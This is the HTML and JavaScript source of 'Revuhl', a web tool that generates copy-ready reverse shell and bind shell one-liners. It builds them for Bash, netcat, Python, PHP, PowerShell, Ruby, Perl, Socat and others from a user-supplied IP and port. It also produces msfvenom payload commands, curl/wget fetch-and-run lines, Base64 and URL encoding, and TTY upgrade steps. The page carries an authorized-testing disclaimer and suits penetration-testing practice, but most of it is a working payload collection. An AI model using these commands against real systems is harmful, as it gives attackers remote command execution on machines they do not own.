<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Revuhl — Reverse Shell Generator</title>
<style>
  :root {
    --bg: #0a0e14;
    --surface: #12171f;
    --surface-2: #1a2030;
    --border: #1e2a3a;
    --text: #e6edf3;
    --muted: #7a8a9e;
    --accent: #6e56cf;
    --accent-glow: rgba(110,86,207,.25);
    --cyan: #00d4aa;
    --cyan-glow: rgba(0,212,170,.15);
    --green: #3fb950;
    --red: #f85149;
    --orange: #f0883e;
    --pink: #db61a2;
    --yellow: #e3b341;
    --code-bg: #0a0e14;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { height: 100%; overflow-y: auto; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
    background: var(--bg);
    background-image: radial-gradient(ellipse at 20% 50%, rgba(110,86,207,.06) 0%, transparent 50%),
                      radial-gradient(ellipse at 80% 20%, rgba(0,212,170,.04) 0%, transparent 50%);
    color: var(--text);
    min-height: 100vh;
    padding: .75rem 1.25rem;
    display: flex; flex-direction: column;
  }
  .container {
    max-width: 100%; margin: 0 auto; width: 100%;
    display: flex; flex-direction: column; flex: 1;
    min-height: 0;
  }
  h1 { font-size: 1.4rem; background: linear-gradient(135deg, var(--cyan), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .subtitle { color: var(--muted); margin-bottom: .6rem; font-size: .8rem; }

  /* Top config bar */
  .config-bar {
    display: flex; gap: .75rem; flex-wrap: wrap;
    margin-bottom: .6rem; align-items: flex-end;
  }
  .input-group { display: flex; flex-direction: column; gap: .3rem; }
  .input-group label {
    font-size: .8rem; color: var(--muted);
    text-transform: uppercase; letter-spacing: .05em;
  }
  .input-group input, .input-group select {
    background: var(--surface-2); border: 1px solid var(--border);
    color: var(--text); padding: .55rem .75rem; border-radius: 6px;
    font-size: .95rem; outline: none; transition: border-color .2s, box-shadow .2s;
  }
  .input-group input:focus, .input-group select:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
  .input-group input::placeholder { color: var(--muted); }

  /* Listener inline in config bar */
  .listener-pill {
    display: flex; align-items: center; gap: .75rem;
    background: linear-gradient(135deg, rgba(0,212,170,.08), rgba(63,185,80,.08));
    border: 1px solid rgba(0,212,170,.25);
    border-radius: 6px; padding: .75rem 1.5rem; cursor: pointer;
    transition: border-color .15s, box-shadow .15s; margin-left: auto;
  }
  .listener-pill:hover { border-color: var(--cyan); box-shadow: 0 0 12px rgba(0,212,170,.15); }
  .listener-pill .lbl {
    font-size: .9rem; color: var(--cyan);
    text-transform: uppercase; letter-spacing: .05em; font-weight: 600;
  }
  .listener-pill .cmd {
    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
    font-size: 1.15rem; color: var(--green);
  }
  .listener-pill.copied { border-color: var(--green); box-shadow: 0 0 12px rgba(63,185,80,.2); }

  /* Tab bar */
  .tab-bar {
    display: flex; gap: .35rem; margin-bottom: .6rem;
  }
  .tab-btn {
    padding: .45rem 1.25rem; border-radius: 6px;
    background: var(--surface); border: 1px solid var(--border);
    color: var(--muted); cursor: pointer;
    font-size: .85rem; font-weight: 600; transition: all .15s;
    user-select: none;
  }
  .tab-btn:hover { color: var(--text); background: var(--surface-2); }
  .tab-btn.active {
    color: var(--cyan); background: var(--surface-2);
    border-color: var(--accent);
    box-shadow: inset 0 -2px 0 var(--accent);
  }
  .tab-content { display: none; flex: 1; min-height: 0; }
  .tab-content.active { display: flex; flex-direction: column; }

  /* Two-column: shell list left, output right */
  .workspace {
    display: flex; gap: 1rem;
    flex: 1; min-height: 0;
  }

  /* Left — shell list */
  .shell-list {
    width: 260px; flex-shrink: 0;
    background: var(--surface); border: 1px solid var(--border);
    border-radius: 8px; display: flex; flex-direction: column;
    overflow: hidden;
  }
  .shell-list-header {
    padding: .6rem 1rem; font-size: .75rem; color: var(--cyan);
    text-transform: uppercase; letter-spacing: .08em; font-weight: 700;
    border-bottom: 1px solid var(--border); flex-shrink: 0;
    background: linear-gradient(90deg, rgba(0,212,170,.06), transparent);
  }
  .shell-list-scroll {
    overflow-y: auto; flex: 1;
    scrollbar-width: thin;
    scrollbar-color: var(--border) transparent;
  }
  .shell-list-scroll::-webkit-scrollbar { width: 6px; }
  .shell-list-scroll::-webkit-scrollbar-track { background: transparent; }
  .shell-list-scroll::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
  .shell-list-scroll::-webkit-scrollbar-thumb:hover { background: var(--muted); }

  .shell-item {
    padding: .55rem 1rem; font-size: .85rem;
    cursor: pointer; color: var(--muted);
    transition: all .15s; border-left: 3px solid transparent;
    user-select: none;
  }
  .shell-item:hover {
    background: rgba(110,86,207,.06);
    border-left-color: var(--accent);
    color: var(--text);
  }
  .shell-item.active {
    background: linear-gradient(90deg, rgba(110,86,207,.12), transparent);
    border-left-color: var(--accent);
    color: #c4b5fd;
  }

  /* Right — output */
  .output-panel {
    flex: 1; min-width: 0;
    background: var(--surface); border: 1px solid var(--border);
    border-radius: 8px; display: flex; flex-direction: column;
    overflow: hidden;
  }
  .output-header {
    display: flex; align-items: center; justify-content: space-between;
    padding: .6rem 1rem; border-bottom: 1px solid var(--border);
    flex-shrink: 0;
    background: linear-gradient(90deg, rgba(110,86,207,.06), transparent);
  }
  .output-title { font-size: .85rem; font-weight: 600; color: #c4b5fd; }
  .output-tag {
    font-size: .7rem; padding: .15rem .5rem; border-radius: 99px;
    background: rgba(88,166,255,.12); color: var(--accent);
  }
  .output-body {
    position: relative; flex: 1; display: flex; flex-direction: column;
  }
  .output-body pre {
    margin: 0; padding: 1rem; padding-right: 4.5rem; overflow: auto;
    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
    font-size: .85rem; line-height: 1.6; color: var(--text);
    background: var(--code-bg); white-space: pre-wrap; word-break: break-all;
    flex: 1;
  }
  .output-body .copy-btn {
    position: absolute; top: .5rem; right: .5rem;
    background: var(--accent); border: 1px solid transparent;
    color: #fff; padding: .35rem .7rem; border-radius: 5px;
    cursor: pointer; font-size: .75rem; transition: all .15s;
    font-weight: 600;
  }
  .output-body .copy-btn:hover { background: #7c66d4; box-shadow: 0 0 10px var(--accent-glow); }
  .output-body .copy-btn.copied { background: var(--green); color: #fff; box-shadow: 0 0 10px rgba(63,185,80,.3); }

  .empty-state {
    display: flex; align-items: center; justify-content: center;
    flex: 1; color: var(--muted); font-size: .85rem; padding: 1rem;
  }

  /* TTY Upgrade grid */
  .tty-grid {
    display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
    gap: .75rem; overflow-y: auto; flex: 1; align-content: start;
    scrollbar-width: thin; scrollbar-color: var(--border) transparent;
  }
  .tty-grid::-webkit-scrollbar { width: 6px; }
  .tty-grid::-webkit-scrollbar-track { background: transparent; }
  .tty-grid::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
  .tty-card {
    background: var(--surface); border: 1px solid var(--border);
    border-radius: 8px; overflow: hidden;
  }
  .tty-card-header {
    display: flex; align-items: center; justify-content: space-between;
    padding: .5rem .85rem; border-bottom: 1px solid var(--border);
  }
  .tty-card-name { font-size: .8rem; font-weight: 600; }
  .tty-card-step {
    font-size: .65rem; padding: .1rem .4rem; border-radius: 99px;
    background: rgba(240,136,62,.12); color: var(--orange);
  }
  .tty-card-body { position: relative; }
  .tty-card-body pre {
    margin: 0; padding: .75rem .85rem; padding-right: 4rem; overflow-x: auto;
    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
    font-size: .82rem; line-height: 1.5; color: var(--text);
    background: var(--code-bg); white-space: pre-wrap; word-break: break-all;
  }
  .tty-card-body .copy-btn {
    position: absolute; top: .4rem; right: .4rem;
    background: var(--accent); border: 1px solid transparent;
    color: #fff; padding: .25rem .55rem; border-radius: 5px;
    cursor: pointer; font-size: .7rem; transition: all .15s; font-weight: 600;
  }
  .tty-card-body .copy-btn:hover { background: #7c66d4; }
  .tty-card-body .copy-btn.copied { background: var(--green); color: #fff; }

  footer {
    text-align: center; color: var(--muted);
    font-size: .7rem; margin-top: .5rem; padding-bottom: .25rem; flex-shrink: 0;
  }

  /* Responsive */
  @media (max-width: 760px) {
    body { overflow: auto; height: auto; }
    .container { flex: none; }
    .workspace { flex-direction: column; flex: none; height: auto; }
    .shell-list { width: 100%; max-height: 240px; }
    .output-panel { min-height: 300px; }
  }
</style>
</head>
<body>
<div class="container">
  <div style="display:flex; align-items:center; gap:.75rem; margin-bottom:.3rem;">
    <img src="img/Rev-nobg.png" alt="Revuhl" style="height:90px;">
    <span class="subtitle" style="margin-bottom:0; margin-left:.5rem;">For authorized penetration testing and security assessments only.</span>
  </div>

  <!-- Top bar: IP, Port, Encoding, Listener -->
  <div class="config-bar">
    <div class="input-group">
      <label for="ip">IP Address</label>
      <input type="text" id="ip" placeholder="10.10.14.1" spellcheck="false" style="width:280px">
    </div>
    <div class="input-group">
      <label for="port">Port</label>
      <input type="text" id="port" placeholder="4444" spellcheck="false" style="width:140px">
    </div>
    <div class="input-group">
      <label for="encoding">Encoding</label>
      <select id="encoding" style="width:180px">
        <option value="none">None</option>
        <option value="base64">Base64</option>
        <option value="url">URL Encode</option>
      </select>
    </div>
    <div class="listener-pill" id="listener-pill" title="Click to copy">
      <span class="lbl">Listener</span>
      <span class="cmd" id="listener-cmd">nc -lvnp 4444</span>
    </div>
  </div>

  <!-- Tabs -->
  <div class="tab-bar">
    <button class="tab-btn active" data-tab="reverse">Reverse Shell</button>
    <button class="tab-btn" data-tab="bind">Bind Shell</button>
    <button class="tab-btn" data-tab="tty">TTY Upgrade</button>
  </div>

  <!-- Reverse Shell Tab -->
  <div class="tab-content active" id="tab-reverse">
    <div class="workspace">
      <div class="shell-list">
        <div class="shell-list-header">Reverse Shells</div>
        <div class="shell-list-scroll" id="shell-list"></div>
      </div>
      <div class="output-panel">
        <div class="output-header">
          <span class="output-title" id="output-title">Select a shell &larr;</span>
          <span class="output-tag" id="output-tag"></span>
        </div>
        <div class="output-body" id="output-body">
          <div class="empty-state">Pick a reverse shell from the list</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Bind Shell Tab -->
  <div class="tab-content" id="tab-bind">
    <div class="workspace">
      <div class="shell-list">
        <div class="shell-list-header">Bind Shells</div>
        <div class="shell-list-scroll" id="bind-shell-list"></div>
      </div>
      <div class="output-panel">
        <div class="output-header">
          <span class="output-title" id="bind-output-title">Select a shell &larr;</span>
          <span class="output-tag" id="bind-output-tag"></span>
        </div>
        <div class="output-body" id="bind-output-body">
          <div class="empty-state">Pick a bind shell from the list</div>
        </div>
      </div>
    </div>
  </div>

  <!-- TTY Upgrade Tab -->
  <div class="tab-content" id="tab-tty">
    <div class="tty-grid" id="tty-grid"></div>
  </div>

  <footer>Revuhl &mdash; Use responsibly and only with proper authorization.</footer>
</div>

<script>
(function () {
  "use strict";

  const ipEl        = document.getElementById("ip");
  const portEl      = document.getElementById("port");
  const encodingEl  = document.getElementById("encoding");
  const listenerEl  = document.getElementById("listener-cmd");
  const listenerPill = document.getElementById("listener-pill");
  const listenerLbl  = listenerPill.querySelector(".lbl");

  /* ── Tab switching ── */
  const tabBtns = document.querySelectorAll(".tab-btn");
  const tabContents = document.querySelectorAll(".tab-content");
  let activeTab = "reverse";

  tabBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      activeTab = btn.dataset.tab;
      tabBtns.forEach(b => b.classList.toggle("active", b === btn));
      tabContents.forEach(tc => tc.classList.toggle("active", tc.id === "tab-" + activeTab));
      updateListener();
    });
  });

  /* ── Helpers ── */
  function sanitize(text) {
    const el = document.createElement("span");
    el.textContent = text;
    return el.innerHTML;
  }

  function encode(raw, method) {
    if (method === "base64") return btoa(unescape(encodeURIComponent(raw)));
    if (method === "url") return encodeURIComponent(raw);
    return raw;
  }

  function copyText(text, btn) {
    navigator.clipboard.writeText(text).then(() => {
      const orig = btn.textContent;
      btn.textContent = "Copied!";
      btn.classList.add("copied");
      setTimeout(() => { btn.textContent = orig; btn.classList.remove("copied"); }, 1500);
    });
  }

  /* ── Listener update ── */
  function updateListener() {
    const ip   = ipEl.value.trim() || "10.10.14.1";
    const port = portEl.value.trim() || "4444";
    if (activeTab === "bind") {
      listenerLbl.textContent = "Connect";
      listenerEl.textContent = `nc ${ip} ${port}`;
    } else {
      listenerLbl.textContent = "Listener";
      listenerEl.textContent = `nc -lvnp ${port}`;
    }
  }

  /* ── Generic shell tab builder ── */
  function buildShellTab(config) {
    const { shells, listEl, titleEl, tagEl, bodyEl } = config;
    let selectedIdx = null;
    const itemEls = [];

    shells.forEach((s, i) => {
      const item = document.createElement("div");
      item.className = "shell-item";
      item.textContent = s.name;
      item.addEventListener("click", () => selectShell(i));
      listEl.appendChild(item);
      itemEls[i] = item;
    });

    function selectShell(idx) {
      selectedIdx = idx;
      itemEls.forEach((el, i) => el.classList.toggle("active", i === idx));
      render();
    }

    function render() {
      const ip   = ipEl.value.trim() || "10.10.14.1";
      const port = portEl.value.trim() || "4444";
      const enc  = encodingEl.value;
      updateListener();

      if (selectedIdx === null) {
        titleEl.innerHTML = "Select a shell &larr;";
        tagEl.textContent = "";
        bodyEl.innerHTML = '<div class="empty-state">Pick a shell from the list</div>';
        return;
      }

      const s = shells[selectedIdx];
      const raw = s.fn(ip, port);
      const display = encode(raw, enc);

      titleEl.textContent = s.name;
      tagEl.textContent = "";
      bodyEl.innerHTML = `
        <pre>${sanitize(display)}</pre>
        <button class="copy-btn" title="Copy to clipboard">Copy</button>`;
      bodyEl.querySelector(".copy-btn").addEventListener("click", function () {
        copyText(display, this);
      });
    }

    selectShell(0);
    return { render };
  }

  /* ── Reverse Shell definitions ── */
  const reverseShells = [
    { name: "Bash -i",          fn: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
    { name: "Bash read",        fn: (ip, p) => `0<&196;exec 196<>/dev/tcp/${ip}/${p}; bash <&196 >&196 2>&196` },
    { name: "Bash 5",           fn: (ip, p) => `bash -i 5<> /dev/tcp/${ip}/${p} 0<&5 1>&5 2>&5` },
    { name: "Bash UDP",         fn: (ip, p) => `bash -i >& /dev/udp/${ip}/${p} 0>&1` },
    { name: "nc -e",            fn: (ip, p) => `nc ${ip} ${p} -e /bin/bash` },
    { name: "nc -c",            fn: (ip, p) => `nc -c /bin/bash ${ip} ${p}` },
    { name: "nc mkfifo",        fn: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${p} >/tmp/f` },
    { name: "nc -i (OpenBSD)",  fn: (ip, p) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
    { name: "ncat (SSL)",       fn: (ip, p) => `ncat --ssl ${ip} ${p} -e /bin/bash` },
    { name: "BusyBox nc",       fn: (ip, p) => `busybox nc ${ip} ${p} -e /bin/sh` },
    { name: "Python3",          fn: (ip, p) => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
    { name: "Python3 subprocess", fn: (ip, p) => `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${ip}",${p}));subprocess.call(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)'` },
    { name: "Python2",          fn: (ip, p) => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
    { name: "PHP exec",         fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/bash -i <&3 >&3 2>&3");'` },
    { name: "PHP proc_open",    fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
    { name: "PHP system",       fn: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});while($cmd=fgets($sock)){$output=shell_exec($cmd);fwrite($sock,$output);}'` },
    { name: "PowerShell #1",    fn: (ip, p) => `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"` },
    { name: "PowerShell #2 (Base64)", fn: (ip, p) => {
      const inner = `$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
      return `powershell -nop -enc ${btoa(unescape(encodeURIComponent(inner)))}`;
    }},
    { name: "CMD",              fn: (ip, p) => `cmd.exe /c "start /b powershell -nop -c \\"$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()\\""` },
    { name: "curl + bash",      fn: (ip, p) => `curl http://${ip}:${p}/shell.sh | bash` },
    { name: "wget + bash",      fn: (ip, p) => `wget -qO- http://${ip}:${p}/shell.sh | bash` },
    { name: "Ruby",             fn: (ip, p) => `ruby -rsocket -e'spawn("/bin/bash",[:in,:out,:err]=>TCPSocket.new("${ip}",${p}))'` },
    { name: "Ruby fork",        fn: (ip, p) => `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}",${p});loop{c.gets.chomp!;(IO.popen($$_,"r"){|io|c.print io.read})rescue nil}'` },
    { name: "Perl",             fn: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'` },
    { name: "Perl no sh",       fn: (ip, p) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${p}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` },
    { name: "Socat",            fn: (ip, p) => `socat TCP:${ip}:${p} EXEC:/bin/bash` },
    { name: "Socat TTY",        fn: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane` },
    { name: "Lua",              fn: (ip, p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${p}');os.execute('/bin/bash -i <&3 >&3 2>&3');"` },
    { name: "Awk",              fn: (ip, p) => `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${p}"; while(42) { do{ printf "$ " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
    { name: "Java",             fn: (ip, p) => `Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done"}); p.waitFor();` },
    { name: "xterm",            fn: (ip, p) => `xterm -display ${ip}:1` },
    { name: "msfvenom (linux staged)", fn: (ip, p) => `msfvenom -p linux/x64/shell/reverse_tcp LHOST=${ip} LPORT=${p} -f elf -o rev.elf` },
    { name: "msfvenom (linux)",  fn: (ip, p) => `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f elf -o rev.elf` },
    { name: "msfvenom (windows)", fn: (ip, p) => `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${p} -f exe -o rev.exe` },
  ];

  const reverseTab = buildShellTab({
    shells: reverseShells,
    listEl: document.getElementById("shell-list"),
    titleEl: document.getElementById("output-title"),
    tagEl: document.getElementById("output-tag"),
    bodyEl: document.getElementById("output-body"),
  });

  /* ── Bind Shell definitions ── */
  const bindShells = [
    { name: "nc -e",            fn: (ip, p) => `nc -lvp ${p} -e /bin/bash` },
    { name: "nc -c",            fn: (ip, p) => `nc -c /bin/bash -lvp ${p}` },
    { name: "nc mkfifo",        fn: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp ${p} >/tmp/f` },
    { name: "BusyBox nc",       fn: (ip, p) => `busybox nc -lvp ${p} -e /bin/sh` },
    { name: "Ncat",             fn: (ip, p) => `ncat -lvp ${p} -e /bin/bash` },
    { name: "Ncat (SSL)",       fn: (ip, p) => `ncat --ssl -lvp ${p} -e /bin/bash` },
    { name: "Python3",          fn: (ip, p) => `python3 -c 'import os,pty,socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
    { name: "Python2",          fn: (ip, p) => `python -c 'import os,pty,socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` },
    { name: "PHP",              fn: (ip, p) => `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${p});socket_listen($s,1);$c=socket_accept($s);while(1){socket_write($c,"$ ");$in=socket_read($c,2048);$out=shell_exec($in);socket_write($c,$out);}'` },
    { name: "Perl",             fn: (ip, p) => `perl -e 'use Socket;$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack("l",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");'` },
    { name: "Socat",            fn: (ip, p) => `socat TCP-LISTEN:${p},reuseaddr,fork EXEC:/bin/bash` },
    { name: "Socat TTY",        fn: (ip, p) => `socat TCP-LISTEN:${p},reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane` },
    { name: "Ruby",             fn: (ip, p) => `ruby -rsocket -e 's=TCPServer.new("0.0.0.0",${p});c=s.accept;spawn("/bin/bash",[:in,:out,:err]=>c)'` },
    { name: "PowerShell",       fn: (ip, p) => `powershell -nop -c "$l=New-Object Net.Sockets.TcpListener([IPAddress]::Any,${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$l.Stop()"` },
    { name: "Lua",              fn: (ip, p) => `lua -e "require('socket');s=socket.tcp();s:bind('*',${p});s:listen(1);c=s:accept();os.execute('/bin/bash -i <&3 >&3 2>&3')"` },
    { name: "msfvenom (linux)", fn: (ip, p) => `msfvenom -p linux/x64/shell_bind_tcp LPORT=${p} -f elf -o bind.elf` },
    { name: "msfvenom (windows)", fn: (ip, p) => `msfvenom -p windows/x64/shell_bind_tcp LPORT=${p} -f exe -o bind.exe` },
  ];

  const bindTab = buildShellTab({
    shells: bindShells,
    listEl: document.getElementById("bind-shell-list"),
    titleEl: document.getElementById("bind-output-title"),
    tagEl: document.getElementById("bind-output-tag"),
    bodyEl: document.getElementById("bind-output-body"),
  });

  /* ── Events ── */
  listenerPill.addEventListener("click", function () {
    copyText(listenerEl.textContent, this);
  });

  [ipEl, portEl, encodingEl].forEach(el => el.addEventListener("input", () => {
    reverseTab.render();
    bindTab.render();
  }));

  /* ── TTY Upgrade Snippets ── */
  const ttyGrid = document.getElementById("tty-grid");

  const ttySnippets = [
    { name: "Python PTY Spawn", step: "Step 1", cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'` },
    { name: "Python2 PTY Spawn", step: "Step 1", cmd: `python -c 'import pty;pty.spawn("/bin/bash")'` },
    { name: "Script PTY", step: "Step 1", cmd: `script -qc /bin/bash /dev/null` },
    { name: "Expect Spawn", step: "Step 1", cmd: `/usr/bin/expect -c 'spawn /bin/bash; interact'` },
    { name: "Perl PTY", step: "Step 1", cmd: `perl -e 'exec "/bin/bash";'` },
    { name: "Background Shell", step: "Step 2", cmd: `Ctrl+Z` },
    { name: "stty raw", step: "Step 3", cmd: `stty raw -echo; fg` },
    { name: "Reset Terminal", step: "Step 4", cmd: `reset` },
    { name: "Export TERM", step: "Step 4", cmd: `export TERM=xterm-256color` },
    { name: "Export SHELL", step: "Step 4", cmd: `export SHELL=/bin/bash` },
    { name: "Fix stty rows/cols", step: "Step 4", cmd: `stty rows 40 columns 160` },
    { name: "Get stty size (local)", step: "Info", cmd: `stty -a | head -1` },
    { name: "Full Upgrade (one-liner)", step: "All-in-one", cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'\n# Then: Ctrl+Z\n# stty raw -echo; fg\n# export TERM=xterm-256color\n# export SHELL=/bin/bash` },
    { name: "Socat TTY (listener)", step: "Listener", cmd: `socat file:\`tty\`,raw,echo=0 tcp-listen:4444` },
    { name: "Socat TTY (target)", step: "Target", cmd: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444` },
    { name: "rlwrap listener", step: "Listener", cmd: `rlwrap nc -lvnp 4444` },
  ];

  ttySnippets.forEach(s => {
    const card = document.createElement("div");
    card.className = "tty-card";
    card.innerHTML = `
      <div class="tty-card-header">
        <span class="tty-card-name">${sanitize(s.name)}</span>
        <span class="tty-card-step">${sanitize(s.step)}</span>
      </div>
      <div class="tty-card-body">
        <pre>${sanitize(s.cmd)}</pre>
        <button class="copy-btn" title="Copy to clipboard">Copy</button>
      </div>`;
    card.querySelector(".copy-btn").addEventListener("click", function () {
      copyText(s.cmd, this);
    });
    ttyGrid.appendChild(card);
  });

})();
</script>
</body>
</html>
